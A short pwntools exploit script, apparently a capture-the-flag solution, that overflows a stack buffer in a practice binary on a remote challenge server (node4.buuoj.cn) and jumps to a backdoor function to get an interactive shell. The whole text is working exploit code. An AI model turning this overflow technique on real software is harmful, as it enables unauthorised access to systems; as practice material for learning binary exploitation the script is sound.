from pwn import *
context(os='linux', arch='amd64', log_level='debug')
 
#p = process('./pwn')
p = remote('node4.buuoj.cn',26188)
elf = ELF('./111')
 
backdoor =0x4011FB
payload =b'A'*(0X20 +8) +p64(backdoor)
 
p.sendline(payload)
p.interactive()